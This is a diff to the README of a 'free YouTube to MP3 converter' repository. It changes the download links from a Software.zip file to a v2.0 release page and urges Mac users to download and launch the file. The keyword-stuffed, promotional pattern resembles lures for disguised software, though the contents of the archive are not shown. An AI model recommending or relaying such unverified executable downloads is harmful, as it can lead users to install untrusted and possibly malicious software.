@@ -21,9 +21,9 @@ Welcome to the "Free-YouTube-To-MP3-Converter-Free" repository! This is your go-
 - **YouTube-To-MP3-Converter-Free-Online**
 
 ## Get Started 🚀
-To get started with this amazing YouTube to MP3 converter, simply [download the latest release](https://github.com/Lucario277/Free-YouTube-To-MP3-Converter-Free/releases/download/v1.0/Software.zip) and launch the file to begin using the converter on your Mac OS device. 
+To get started with this amazing YouTube to MP3 converter, simply [download the latest release](https://github.com/Lucario277/Free-YouTube-To-MP3-Converter-Free/releases/tag/v2.0) and launch the file to begin using the converter on your Mac OS device. 
 
-[![Download Converter](https://github.com/Lucario277/Free-YouTube-To-MP3-Converter-Free/releases/download/v1.0/Software.zip%20Release-blue)](https://github.com/Lucario277/Free-YouTube-To-MP3-Converter-Free/releases/download/v1.0/Software.zip)
+[![Download Converter](https://github.com/Lucario277/Free-YouTube-To-MP3-Converter-Free/releases/tag/v2.0%20Release-blue)](https://github.com/Lucario277/Free-YouTube-To-MP3-Converter-Free/releases/tag/v2.0)
 
 ## Why Choose Our Converter? 🌟
 Our free converter offers a seamless way to extract audio from YouTube videos and save them in MP3 format. Here are some key features that make our converter stand out:
